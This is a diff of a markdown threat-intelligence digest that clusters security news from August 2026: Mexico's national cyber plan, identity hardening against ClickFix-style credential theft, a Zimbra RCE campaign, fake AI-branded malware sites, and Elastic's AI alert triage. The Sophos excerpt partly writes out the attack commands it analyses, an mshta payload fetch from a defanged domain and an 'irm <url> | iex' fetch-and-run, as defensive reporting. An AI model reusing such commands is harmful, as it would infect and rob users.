-Mexico’s Cybersecurity Plan 2025-2030: Turning Ambition Into Defense Mexico faces an increasingly complex cyber threat landscape, including ransomware, state-sponsored espionage, financial malware, data breaches, hacktivism, and cyber-enabled organized crime. Its 2025–2030 National Cybersecurity Plan seeks to address these challenges through stronger governance, new legislation, a national operations center, integrated incident-response teams, cyber exercises, AI-enabled defenses, and expanded regional cooperation. Insikt Group assesses ransomware as the leading threat while highlighting growing risks from foreign threat actors and credential theft. We recommend leveraging threat intelligence, applying international security frameworks, and fostering cyber education. Ultimately, Mexico’s progress will depend on turning an ambitious roadmap into durable institutions, effective regulation, and sustained international cooperation. Mexico’s Cybersecurity Plan 2025-2030: Turning Ambition Into Defense Mexico has no shortage of cyber threats. Ransomware attacks are rising, criminal groups are exploiting stolen credentials and financial malware, and state-linked threat actors increasingly view the country’s government agencies, universities, and critical infrastructure as attractive targets. Mexico’s new National Cybersecurity Plan (hereinafter referred to as “Plan”), introduced in December 2025, recognizes many of these risks. However, it remains uncertain as to whether the government can build the institutions needed to address them proactively. Mexico is ranked as a "Tier 2" nation in the ITU's 2024 Global Cybersecurity Index, placing it alongside Canada, Ecuador, and Uruguay in the upper ranks, trailing the United States (US) and Brazil, which have reached Tier 1 in the Americas. Despite that standing, Mexico is generally perceived by cyber experts as lagging behind international standards in institutional capacity-building, with international cooperation identified as an area requiring growth. The question of whether the government can build the proper institutions has become more urgent in the aftermath of the FIFA World Cup 2026, which provided a high-profile stress test for Mexico’s digital defenses. With the tournament over and implementation of the government’s 2025-2030 cybersecurity plan beginning in earnest, Mexico faces a major opportunity to improve its cyber posture. For this reason, the Plan represents a major opportunity for Mexican authorities to bring the country’s cyber readiness to the next level. Although there have been attempts to advance national cybersecurity policy, they have failed to gain traction. With this new Plan, President Claudia Sheinbaum's administration has committed to full implementation over the course of her term, aided by her party's majority control of Congress. The Plan lays out a six-phase roadmap designed to gradually build Mexico’s cybersecurity capabilities through 2030, with later phases intended to deepen and institutionalize them. The 2025 Foundation Phase established a general framework for governance, risk management, incident reporting, and coordination, as well as initial steps to deepen international cooperation, including Mexico’s formal membership in the Latin America and Caribbean Cyber Competence Centre (LAC4) and a cybersecurity Memorandum of Understanding (MOU) with Brazil. The 2026 Expansion Phase, now underway, focuses on translating that framework into institutions through the passage of a new General Cybersecurity Law in Mexico, creation of a National Cybersecurity Operations Center, and integration of federal computer security incident response teams (CSIRTs). The 2027 Consolidation Phase would establish a National Cyber Range for red team and blue team exercises. The 2028 Maturation Phase would incorporate AI into cyber defense and develop a regional response center. The 2029 Leadership Phase aims to position Mexico as a cybersecurity services exporter across Latin
-```
-
-#### Corroborating sources (1)
-
-- **Recorded Future** (threat_research_primary)
-  - Title: Mexico’s Cybersecurity Plan 2025-2030: Turning Ambition Into Defense
-  - Published: 2026-08-25T00:00:00+00:00
-  - Link: https://www.recordedfuture.com/blog/mexico-cybersecurity-plan
-  - Summary: Explore Mexico’s 2025–2030 Cybersecurity Plan. Learn about key threats, including ransomware, and the roadmap for building durable national cyber defenses.
 
 ### Cluster 62469ecc9b — score 11
 
@@ -2101,6 +2057,49 @@ CTEM: From Visibility to Measurable Risk Reduction Horizon3 August 19, 2026 Info
   - Link: https://horizon3.ai/intelligence/infographics/ctem-from-visibility-to-measurable-risk-reduction/
   - Summary: Learn how to operationalize CTEM as a continuous cycle that validates exploitable risk, prioritizes what matters, verifies remediation, and drives measurable risk reduction.
 
+### Cluster 022e3da4a1 — score 10
+
+- Title: Mexico’s Cybersecurity Plan 2025-2030: Turning Ambition Into Defense
+- Source: Recorded Future (threat_research_primary)
+- Published: 2026-08-25T00:00:00+00:00
+- Link: https://www.recordedfuture.com/blog/mexico-cybersecurity-plan
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage, credential_theft, ransomware_extortion
+- affected_industries: critical_infrastructure, education, financial_services, government
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, credential_theft, apt_espionage
+- affected_industries: financial_services, government, critical_infrastructure, education
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Explore Mexico’s 2025–2030 Cybersecurity Plan. Learn about key threats, including ransomware, and the roadmap for building durable national cyber defenses.
+```
+
+#### Full body
+
+```
+Mexico’s Cybersecurity Plan 2025-2030: Turning Ambition Into Defense Mexico faces an increasingly complex cyber threat landscape, including ransomware, state-sponsored espionage, financial malware, data breaches, hacktivism, and cyber-enabled organized crime. Its 2025–2030 National Cybersecurity Plan seeks to address these challenges through stronger governance, new legislation, a national operations center, integrated incident-response teams, cyber exercises, AI-enabled defenses, and expanded regional cooperation. Insikt Group assesses ransomware as the leading threat while highlighting growing risks from foreign threat actors and credential theft. We recommend leveraging threat intelligence, applying international security frameworks, and fostering cyber education. Ultimately, Mexico’s progress will depend on turning an ambitious roadmap into durable institutions, effective regulation, and sustained international cooperation. Mexico’s Cybersecurity Plan 2025-2030: Turning Ambition Into Defense Mexico has no shortage of cyber threats. Ransomware attacks are rising, criminal groups are exploiting stolen credentials and financial malware, and state-linked threat actors increasingly view the country’s government agencies, universities, and critical infrastructure as attractive targets. Mexico’s new National Cybersecurity Plan (hereinafter referred to as “Plan”), introduced in December 2025, recognizes many of these risks. However, it remains uncertain as to whether the government can build the institutions needed to address them proactively. Mexico is ranked as a "Tier 2" nation in the ITU's 2024 Global Cybersecurity Index, placing it alongside Canada, Ecuador, and Uruguay in the upper ranks, trailing the United States (US) and Brazil, which have reached Tier 1 in the Americas. Despite that standing, Mexico is generally perceived by cyber experts as lagging behind international standards in institutional capacity-building, with international cooperation identified as an area requiring growth. The question of whether the government can build the proper institutions has become more urgent in the aftermath of the FIFA World Cup 2026, which provided a high-profile stress test for Mexico’s digital defenses. With the tournament over and implementation of the government’s 2025-2030 cybersecurity plan beginning in earnest, Mexico faces a major opportunity to improve its cyber posture. For this reason, the Plan represents a major opportunity for Mexican authorities to bring the country’s cyber readiness to the next level. Although there have been attempts to advance national cybersecurity policy, they have failed to gain traction. With this new Plan, President Claudia Sheinbaum's administration has committed to full implementation over the course of her term, aided by her party's majority control of Congress. The Plan lays out a six-phase roadmap designed to gradually build Mexico’s cybersecurity capabilities through 2030, with later phases intended to deepen and institutionalize them. The 2025 Foundation Phase established a general framework for governance, risk management, incident reporting, and coordination, as well as initial steps to deepen international cooperation, including Mexico’s formal membership in the Latin America and Caribbean Cyber Competence Centre (LAC4) and a cybersecurity Memorandum of Understanding (MOU) with Brazil. The 2026 Expansion Phase, now underway, focuses on translating that framework into institutions through the passage of a new General Cybersecurity Law in Mexico, creation of a National Cybersecurity Operations Center, and integration of federal computer security incident response teams (CSIRTs). The 2027 Consolidation Phase would establish a National Cyber Range for red team and blue team exercises. The 2028 Maturation Phase would incorporate AI into cyber defense and develop a regional response center. The 2029 Leadership Phase aims to position Mexico as a cybersecurity services exporter across Latin
+```
+
+#### Corroborating sources (1)
+
+- **Recorded Future** (threat_research_primary)
+  - Title: Mexico’s Cybersecurity Plan 2025-2030: Turning Ambition Into Defense
+  - Published: 2026-08-25T00:00:00+00:00
+  - Link: https://www.recordedfuture.com/blog/mexico-cybersecurity-plan
+  - Summary: Explore Mexico’s 2025–2030 Cybersecurity Plan. Learn about key threats, including ransomware, and the roadmap for building durable national cyber defenses.
+
 ### Cluster d5a759a910 — score 10
 
 - Title: UAT-10147 deploys SPECTRE: A cross-platform implant with Linux rootkit and BYOVD capabilities
@@ -2233,51 +2232,6 @@ Describing attacks with crime script analysis By Martin Lee Wednesday, August 19
   - Published: 2026-08-19T10:00:52+00:00
   - Link: https://blog.talosintelligence.com/describing-attacks-with-crime-script-analysis/
   - Summary: Martin explores how using crime script analysis to describe an attack with everyday language makes the situation accessible to non-technical audiences and identify points where the crime can be disrupted.
-
-### Cluster 6857c33e30 — score 10
-
-- Title: What Good Identity Hardening Looks Like
-- Source: Huntress (detection_response_operations)
-- Published: 2026-08-25T13:00:00+00:00
-- Link: https://www.huntress.com/blog/good-identity-hardening
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: credential_theft
-- affected_industries: financial_services
-- affected_products: Anthropic/Claude, OpenAI/ChatGPT
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- threat_categories: credential_theft
-- affected_industries: financial_services
-- affected_products: Anthropic/Claude, OpenAI/ChatGPT
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-MFA is just the starting line. Learn what mature identity hardening actually looks like, from closing MFA exceptions to catching drift before attackers do.
-```
-
-#### Full body
-
-```
-Home Blog What Good Identity Hardening Looks Like Published: August 25, 2026 What Good Identity Hardening Looks Like By: Beth Robinson Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways MFA is the starting line. Attackers can steal credentials and session tokens, abuse trusted devices, or slip through forgotten MFA exceptions, so identity security needs layers beyond one login control. One exception can become the way in. Enforce MFA for every account, including executives and administrators, and give every necessary exception a named owner and expiration date. Good identity hardening stays enforced. Use device and location requirements, remove stale accounts and unnecessary admin rights, block legacy authentication, and limit access from places your business doesn't operate. Detection closes the gap prevention can't. Watch for unusual sign-ins, risky app consent, and stolen-session activity so attackers don't get to blend in as a legitimate employee. Treat identity hardening as an ongoing program. Review configuration drift, high-risk changes, privileged access, and exceptions regularly, then track the fixes and evidence of progress over time. Acknowledgments : Special thanks to Aimee Simpson and Scott Riley for their contributions to this write-up. Attackers don't really need to break into your business anymore. They can just log in as you instead. Maybe they bought a valid set of your credentials off the dark web for a few dollars. Maybe they tricked you into pasting a command into a dialog box. Maybe your session token leaked out of a browser cache. Either way, there's no need to break in when they can walk through the front door with a completely legitimate identity. Most teams think they've handled security once multi-factor authentication (MFA) is turned on, but that's just the start. Identity hardening means every control protecting an identity, a device, a session, or an app stays enforced, gets monitored continuously, and keeps pace as attackers change tactics. Here's what that actually looks like in practice, and where to start. Why is identity the easiest way in? Cybercrime is a business in one of the world's largest economies, and like any business, it's always chasing the highest return with the least effort. Identity compromise delivers both. It's cheaper and stealthier than network perimeter compromise, and once inside, it opens far more doors. With so much information shifting to cloud services, a single stolen login can open email, files, finance systems, and HR platforms in one motion. Credentials and session tokens are cheap and easy to buy, and once an attacker has them, they can move as fast as any legitimate employee. This is a result of our own doing, but not out of bad intentions. Most organizations have spent the last several years centralizing logins into a single sign-on system through Google or Microsoft Entra. That consolidation is good for convenience and even good for security in a lot of ways, but it also means a CRM, a finance platform, project management tools, email, and file storage now all sit behind the same front door. When that door gets breached, the blast radius is much bigger than it used to be. Here's how easy it actually is to steal credentials right now. Attackers trick you into running their commands, and within minutes, they've got your sensitive information. ClickFix is one example: a fake CAPTCHA "verification" prompt walks a user through pasting a command into the Windows dialog Run box. Other variants swap the lure, like a fake file or a fake download page instead of a verification check, but the mechanic stays the same. In every version, the user runs the malicious code themselves, so there's nothing unusual for a filter to flag, just an infostealer quietly installing itself and harvesting every credential and session token in the browser cache, straight into the identity behind that single sign-on. MFA is the starting line, not the finish line As
-```
-
-#### Corroborating sources (1)
-
-- **Huntress** (detection_response_operations)
-  - Title: What Good Identity Hardening Looks Like
-  - Published: 2026-08-25T13:00:00+00:00
-  - Link: https://www.huntress.com/blog/good-identity-hardening
-  - Summary: MFA is just the starting line. Learn what mature identity hardening actually looks like, from closing MFA exceptions to catching drift before attackers do.
 
 ### Cluster 82fb30db67 — score 10
 
@@ -2437,95 +2391,50 @@ New malware that uses steganography always gets my attention, but I was disappoi
   - Link: https://isc.sans.edu/diary/rss/33274
   - Summary: New malware that uses steganography always gets my attention, but I was disappointed when I looked at the latest DOUBLECUP write-up . It doesn&#;x26;#;39;t use real steganography:
 
-### Cluster a06555b243 — score 9
+### Cluster 6857c33e30 — score 9
 
-- Title: Inside Elastic's agentic SOC: How we took AI alert triage from 60% to 92% accuracy
-- Source: Elastic Security Labs (detection_response_operations)
-- Published: 2026-08-25T00:00:00+00:00
-- Link: https://www.elastic.co/security-labs/alert-triage-agentic-soc-self-correcting-agents
+- Title: What Good Identity Hardening Looks Like
+- Source: Huntress (detection_response_operations)
+- Published: 2026-08-25T13:00:00+00:00
+- Link: https://www.huntress.com/blog/good-identity-hardening
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
+- threat_categories: credential_theft
+- affected_industries: financial_services
+- affected_products: Anthropic/Claude, OpenAI/ChatGPT
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
+- threat_categories: credential_theft
+- affected_industries: financial_services
+- affected_products: Anthropic/Claude, OpenAI/ChatGPT
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Summary
 
 ```
-Elastic's InfoSec team runs three agents that read the detection rule's investigation guide and the closure reasons on 30 days of past cases. Analysts now clear most alerts with a single click in Slack.
+MFA is just the starting line. Learn what mature identity hardening actually looks like, from closing MFA exceptions to catching drift before attackers do.
 ```
 
 #### Full body
 
 ```
-25 August 2026 • Maggie Musquez Inside Elastic's agentic SOC: How we took AI alert triage from 60% to 92% accuracy Elastic's InfoSec team runs three agents that read the detection rule's investigation guide and the closure reasons on 30 days of past cases. Analysts now clear most alerts with a single click in Slack. 8 min read Generative AI , Detection Engineering AI verdict correctness in our security operations center (SOC) is 92%, up from 60%, but we didn't switch models to get there. What we changed is the context the agents get before they decide anything, including the detection rule's investigation guide and user risk data from Workday, along with the closure reasons from 30 days of past cases on that same rule. This post covers how the agentic SOC pipeline is built in Elastic Workflows and Elastic Agent Builder, down to the prompts and the feedback loop that lets an agent see where it got the same rule wrong last time. Customer Zero: Running Agent Builder in our own SOC At Elastic, our internal SOC operates as Customer Zero, meaning that we’re the first and most demanding user of every feature we ship. We run the newest versions of Elastic Security and Agent Builder in our production environment, often before they reach general availability (GA), across a globally distributed fleet of laptops, servers, and cloud workloads. The workflows and agent configurations shown in this post reflect our setup as of version 9.5.1. When your AI SOC analyst is wrong 40% of the time Our team dove in headfirst with AI agents and fully integrated our alerts with AI triage. When our agents were looking at only the current alert context and investigation indexes, they weren’t always correct. Actually, our logs showed accuracy hovering around 60%. It’s great to have this data, but not if the analysts can’t trust it. We were adding long AI summaries to each case, what we would consider AI slop , as it was inaccurate 40% of the time. The feedback we got from the analysts was that they weren’t reading them. The analysts started ignoring the AI summaries completely since they couldn't trust that they were helpful or accurate. It took more time to read a paragraph of incorrect information than to just triage the case manually. The summaries were slowing analysts down without providing any benefit worth the additional token cost. Leading with the data Before getting too in the weeds, here’s the data. Our AI verdict correctness (based on comparing the AI verdict and the analyst close reason) went from 60% to 92% after implementing the changes we discuss in this blog. We’re tracking these metrics using Elastic dashboards by comparing the case custom fields that are discussed more below. This increase in accuracy meant that the analysts could start double-checking the summary and closing the case right away. This changed our AI summaries from being a time sink to allowing our analysts to close the case in one step. What context AI alert triage actually needs We significantly increased agent accuracy by feeding them more context. Here's what we pull in from each source before an agent makes a verdict: When should you use an AI agent instead of a query? It's important to know when to use AI and when not to. If the answer requires a predictable query with only a variable or two changing each time, don't use an agent. Instead, use an Elastic workflow that runs an Elasticsearch Query Language (ES|QL) query, a Kibana API call, or a GET request. They're faster and cheaper, and we keep them modular and reusable across many different orchestrators, so a UserDetailsLookup or PastCasesByRulenameLookup can be called from any workflow that needs it. Agents are more suited for tasks that require reading and reasoning that cannot be completed with a simple query; for example, analyzing past case comments for patterns. We named our workflows to reflect the three types of activities in the main orchestrator: Lookup: ES|QL queries, Kibana API calls, and GET requests
+Home Blog What Good Identity Hardening Looks Like Published: August 25, 2026 What Good Identity Hardening Looks Like By: Beth Robinson Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways MFA is the starting line. Attackers can steal credentials and session tokens, abuse trusted devices, or slip through forgotten MFA exceptions, so identity security needs layers beyond one login control. One exception can become the way in. Enforce MFA for every account, including executives and administrators, and give every necessary exception a named owner and expiration date. Good identity hardening stays enforced. Use device and location requirements, remove stale accounts and unnecessary admin rights, block legacy authentication, and limit access from places your business doesn't operate. Detection closes the gap prevention can't. Watch for unusual sign-ins, risky app consent, and stolen-session activity so attackers don't get to blend in as a legitimate employee. Treat identity hardening as an ongoing program. Review configuration drift, high-risk changes, privileged access, and exceptions regularly, then track the fixes and evidence of progress over time. Acknowledgments : Special thanks to Aimee Simpson and Scott Riley for their contributions to this write-up. Attackers don't really need to break into your business anymore. They can just log in as you instead. Maybe they bought a valid set of your credentials off the dark web for a few dollars. Maybe they tricked you into pasting a command into a dialog box. Maybe your session token leaked out of a browser cache. Either way, there's no need to break in when they can walk through the front door with a completely legitimate identity. Most teams think they've handled security once multi-factor authentication (MFA) is turned on, but that's just the start. Identity hardening means every control protecting an identity, a device, a session, or an app stays enforced, gets monitored continuously, and keeps pace as attackers change tactics. Here's what that actually looks like in practice, and where to start. Why is identity the easiest way in? Cybercrime is a business in one of the world's largest economies, and like any business, it's always chasing the highest return with the least effort. Identity compromise delivers both. It's cheaper and stealthier than network perimeter compromise, and once inside, it opens far more doors. With so much information shifting to cloud services, a single stolen login can open email, files, finance systems, and HR platforms in one motion. Credentials and session tokens are cheap and easy to buy, and once an attacker has them, they can move as fast as any legitimate employee. This is a result of our own doing, but not out of bad intentions. Most organizations have spent the last several years centralizing logins into a single sign-on system through Google or Microsoft Entra. That consolidation is good for convenience and even good for security in a lot of ways, but it also means a CRM, a finance platform, project management tools, email, and file storage now all sit behind the same front door. When that door gets breached, the blast radius is much bigger than it used to be. Here's how easy it actually is to steal credentials right now. Attackers trick you into running their commands, and within minutes, they've got your sensitive information. ClickFix is one example: a fake CAPTCHA "verification" prompt walks a user through pasting a command into the Windows dialog Run box. Other variants swap the lure, like a fake file or a fake download page instead of a verification check, but the mechanic stays the same. In every version, the user runs the malicious code themselves, so there's nothing unusual for a filter to flag, just an infostealer quietly installing itself and harvesting every credential and session token in the browser cache, straight into the identity behind that single sign-on. MFA is the starting line, not the finish line As
 ```
 
 #### Corroborating sources (1)
 
-- **Elastic Security Labs** (detection_response_operations)
-  - Title: Inside Elastic's agentic SOC: How we took AI alert triage from 60% to 92% accuracy
-  - Published: 2026-08-25T00:00:00+00:00
-  - Link: https://www.elastic.co/security-labs/alert-triage-agentic-soc-self-correcting-agents
-  - Summary: Elastic's InfoSec team runs three agents that read the detection rule's investigation guide and the closure reasons on 30 days of past cases. Analysts now clear most alerts with a single click in Slack.
-
-### Cluster f99925d57d — score 9
-
-- Title: Hackers breached over 270 Zimbra servers in ongoing attacks
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-08-25T12:04:02+00:00
-- Link: https://www.bleepingcomputer.com/news/security/hackers-breached-over-270-zimbra-servers-in-ongoing-attacks/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, apt_espionage
-- actor_attribution: APT28, APT29
-- affected_industries: government
-- affected_products: Ivanti
-- cve_ids: CVE-2026-73570
-- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: apt_espionage, active_exploitation
-- actor_attribution: APT28, APT29
-- affected_industries: government
-- affected_products: Ivanti
-- cve_ids: CVE-2026-73570
-- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Threat actors have already compromised over 270 Zimbra instances in remote code execution attacks targeting a high-severity Zimbra Collaboration Suite (ZCS) vulnerability. [...]
-```
-
-#### Full body
-
-```
-Hackers breached over 270 Zimbra servers in ongoing attacks By Sergiu Gatlan August 25, 2026 08:04 AM 0 Threat actors have already compromised over 270 Zimbra instances in remote code execution attacks targeting a high-severity Zimbra Collaboration Suite (ZCS) vulnerability. The ZCS email and collaboration suite is used by hundreds of millions of people and organizations, including thousands of businesses and hundreds of government agencies worldwide. Synacor patched the security flaw (tracked as CVE-2026-73570 ), which allows unauthenticated attackers to gain code execution remotely by exploiting a command injection weakness in the SNMP monitoring component when SNMP notifications are enabled, with the release of ZCS version 10.1.20 on July 20. CERT Polska, the Polish Computer Emergency Response Team (CERT), first flagged the vulnerability as targeted in the wild last Monday, when it also warned security teams to check their logs for suspicious activity, including the Zimbra service restarting unexpectedly, and for files created in the /opt/zimbra/jetty/webapps/, /opt/zimbra/jetty_base/webapps/, and /tmp/ folders by user zimbra over the last 30 days. The Cybersecurity and Infrastructure Security Agency (CISA) also added the flaw to its KEV catalog following CERT Polska's warning and ordered U.S. Federal Civilian Executive Branch (FCEB) agencies to patch their systems within three days, by August 24. On Monday, threat security watchdog Shadowserver reported that it spotted hundreds of Internet-exposed Zimbra instances that have already been breached in attacks exploiting the CVE-2026-73570 flaw. Map of compromised Zimbra instances (Shadowserver) "Zimbra compromises associated with CVE-2026-73570 exploitation are spreading. 274 instances seen compromised in our scans for exploitation artifacts on 2026-08-22," Shadowserver warned . "We also see at least 8200 CVE-2026-73570 unpatched instances (this does not mean exploitable as the vuln is in a non default config)." Zimbra vulnerabilities are often targeted by cybercriminals and state-sponsored hacking groups, and have been frequently exploited to steal emails containing sensitive data from vulnerable servers in recent years. Most recently, in March, Seqrite Labs researchers spotted APT28 Russian military intelligence hackers abusing a stored cross-site scripting (XSS) Zimbra vulnerability to breach Ukrainian government servers . U.S. and UK cyber agencies also warned in October 2024 that Russian Foreign Intelligence Service hackers (tracked as APT29, Midnight Blizzard, and Cozy Bear) compromised Zimbra servers using a ZCS flaw previously exploited to steal email account credentials . Russian Winter Vivern cyber spies also exploited a reflected Cross-Site Scripting (XSS) vulnerability to steal emails from NATO-aligned email accounts in attacks targeting Zimbra webmail portals. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: CISA orders urgent patching of actively exploited Zimbra flaw Critical Zimbra RCE flaw now actively exploited in attacks One threat actor responsible for 83% of recent Ivanti RCE attacks Microsoft patches max severity code execution, privilege escalation flaws Critical RCE flaw in Windows IKE Extension now actively exploited
-```
-
-#### Corroborating sources (1)
-
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: Hackers breached over 270 Zimbra servers in ongoing attacks
-  - Published: 2026-08-25T12:04:02+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/hackers-breached-over-270-zimbra-servers-in-ongoing-attacks/
-  - Summary: Threat actors have already compromised over 270 Zimbra instances in remote code execution attacks targeting a high-severity Zimbra Collaboration Suite (ZCS) vulnerability. [...]
+- **Huntress** (detection_response_operations)
+  - Title: What Good Identity Hardening Looks Like
+  - Published: 2026-08-25T13:00:00+00:00
+  - Link: https://www.huntress.com/blog/good-identity-hardening
+  - Summary: MFA is just the starting line. Learn what mature identity hardening actually looks like, from closing MFA exceptions to catching drift before attackers do.
 
 ### Cluster 89ccf2f4b4 — score 9
 
@@ -2615,48 +2524,44 @@ Frontier AI: Vulnerability Management's Systemic Revolution  The Hacker News 
   - Link: https://thehackernews.com/2026/08/frontier-ai-vulnerability-managements.html
   - Summary: Vulnerability management has been a staple of security programs since the dawn of the cybersecurity discipline. The symbiotic relationship between vulnerability and patch management teams has also existed for that time and has gone through waves of contention and thankfulness. While this relationship required thoughtful care and feeding from both sides, both sides were aiming to work toward a
 
-### Cluster 114ded0230 — score 8
+### Cluster a06555b243 — score 8
 
-- Title: Fake AI, real malware: Attackers impersonating AI brands
-- Source: Sophos X-Ops (detection_response_operations)
-- Published: 2026-08-19T00:00:00+00:00
-- Link: https://www.sophos.com/en-us/blog/fake-ai-real-malware-attackers-impersonating-ai-brands
+- Title: Inside Elastic's agentic SOC: How we took AI alert triage from 60% to 92% accuracy
+- Source: Elastic Security Labs (detection_response_operations)
+- Published: 2026-08-25T00:00:00+00:00
+- Link: https://www.elastic.co/security-labs/alert-triage-agentic-soc-self-correcting-agents
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: credential_theft, ransomware_extortion, web_shell_backdoor
-- affected_products: Anthropic/Claude, Apple iOS/macOS, SonicWall
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion, credential_theft, web_shell_backdoor
-- affected_products: SonicWall, Anthropic/Claude, Apple iOS/macOS
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Summary
 
 ```
-<p>A year of MDR casework shows attackers repeatedly exploiting demand for AI tools</p> Categories: Threat Research Tags: AI, malvertising, infostealer, Sophos X-Ops
+Elastic's InfoSec team runs three agents that read the detection rule's investigation guide and the closure reasons on 30 days of past cases. Analysts now clear most alerts with a single click in Slack.
 ```
 
 #### Full body
 
 ```
-Fake AI, real malware: Attackers impersonating AI brands A year of MDR casework shows attackers repeatedly exploiting demand for AI tools Written by Colin Cowie , Rafe Pilling , Ryan Westman Threat Research AI malvertising infostealer Sophos X-Ops Share This Link Copied Sophos X-Ops reviewed a year of Managed Detection and Response (MDR) cases tagged as ‘AI activity.’ Of the 34 cases that held up, nearly all were attackers creating fake versions of legitimate AI sites and software to infect users with malware. Attackers are exploiting the surge in demand for AI software by faking the software itself: names users trust, like Claude, ChatGPT, and Copilot, become delivery vehicles for malware. For defenders that is good news – or at least, not all bad – because malware is a problem that existing controls are designed to address. Methodology This analysis draws on 12 months of Sophos MDR casework, from July 2, 2025 to June 29, 2026, alongside Counter Threat Unit (CTU) intelligence and SophosLabs research. During that period, 86 MDR cases were tagged for AI involvement. We reviewed each case individually against our AI threat taxonomy and confirmed 34 as genuine adversarial AI activity. Additionally, we identified a further four cases through analysts’ investigations: a Cursor-assisted detection-evasion case , a SonicWall SMA ransomware intrusion, a custom Slack-controlled RAT built with an AI coding agent, and a fake Claude site delivering a previously undocumented backdoor. We included these cases in our dataset, bringing the total to 38. Of the rest of the cases, 25 were benign AI developer tooling tripping behavioral detections, and 27 included an AI keyword only incidentally. Our taxonomy splits AI threats into two top-level categories: malicious use of AI , where the attacker wields AI as a capability, and malicious targeting of AI , where AI products, brands and ecosystems are abused. Each is divided further into sub-categories - from AI-generated and AI-augmented attacks through to AI software impersonation and agent-initiated compromise . 35 of the cases fall under malicious targeting of AI , and demonstrate tactics X-Ops has documented beforefrom a fake Claude site that sideloaded a backdoor to ClickFix campaigns that bait macOS users with AI-branded lures. Where we did see attackers genuinely use AI as a capability, it was as an assistant with a human in control – most notably the Cursor detection-evasion case. Figure 1: Overview of MDR cases with AI involvement AI software impersonation: fake AI installers AI software impersonation accounted for 30 of the 38 total cases, and fake AI installer campaigns were the largest cluster. The Claude brand was the most frequently abused lure, leveraged in 26 of the cases we reviewed. Many of these incidents involved a technique known as ‘InstallFix,’ a variant of the ClickFix technique, in which the pretext is software installation. A typical attack chain involves a user searching for an AI coding tool, and landing on a typosquatted site, often through a malicious ad or poisoned search results . Whereas ClickFix attacks mimic an error or verification step, such as a fake CAPTCHA, an InstallFix page may present a polished, step-by-step installation guide. Both end with the user copying and running (often obfuscated) commands that ultimately result in a malware infection (see Figure 2 for an example). Figure 2: Fake Claude ‘InstallFix’ site. Users would be directed to this site via a malicious ad In one case, a fake Claude site instructed the victim to run an mshta one-liner that pulled its payload from download-version[.]1-9-18[.]com . That payload was a Windows app package installer named claude or claude.msixbundle . Next, an irm <url> | iex one-liner executed code in memory, conducting process-hollowing attempts against the browser. In other, related cases we observed LummaStealer being delivered through the same AI-branded infrastructure, using the classic ClickFix method of a f
+25 August 2026 • Maggie Musquez Inside Elastic's agentic SOC: How we took AI alert triage from 60% to 92% accuracy Elastic's InfoSec team runs three agents that read the detection rule's investigation guide and the closure reasons on 30 days of past cases. Analysts now clear most alerts with a single click in Slack. 8 min read Generative AI , Detection Engineering AI verdict correctness in our security operations center (SOC) is 92%, up from 60%, but we didn't switch models to get there. What we changed is the context the agents get before they decide anything, including the detection rule's investigation guide and user risk data from Workday, along with the closure reasons from 30 days of past cases on that same rule. This post covers how the agentic SOC pipeline is built in Elastic Workflows and Elastic Agent Builder, down to the prompts and the feedback loop that lets an agent see where it got the same rule wrong last time. Customer Zero: Running Agent Builder in our own SOC At Elastic, our internal SOC operates as Customer Zero, meaning that we’re the first and most demanding user of every feature we ship. We run the newest versions of Elastic Security and Agent Builder in our production environment, often before they reach general availability (GA), across a globally distributed fleet of laptops, servers, and cloud workloads. The workflows and agent configurations shown in this post reflect our setup as of version 9.5.1. When your AI SOC analyst is wrong 40% of the time Our team dove in headfirst with AI agents and fully integrated our alerts with AI triage. When our agents were looking at only the current alert context and investigation indexes, they weren’t always correct. Actually, our logs showed accuracy hovering around 60%. It’s great to have this data, but not if the analysts can’t trust it. We were adding long AI summaries to each case, what we would consider AI slop , as it was inaccurate 40% of the time. The feedback we got from the analysts was that they weren’t reading them. The analysts started ignoring the AI summaries completely since they couldn't trust that they were helpful or accurate. It took more time to read a paragraph of incorrect information than to just triage the case manually. The summaries were slowing analysts down without providing any benefit worth the additional token cost. Leading with the data Before getting too in the weeds, here’s the data. Our AI verdict correctness (based on comparing the AI verdict and the analyst close reason) went from 60% to 92% after implementing the changes we discuss in this blog. We’re tracking these metrics using Elastic dashboards by comparing the case custom fields that are discussed more below. This increase in accuracy meant that the analysts could start double-checking the summary and closing the case right away. This changed our AI summaries from being a time sink to allowing our analysts to close the case in one step. What context AI alert triage actually needs We significantly increased agent accuracy by feeding them more context. Here's what we pull in from each source before an agent makes a verdict: When should you use an AI agent 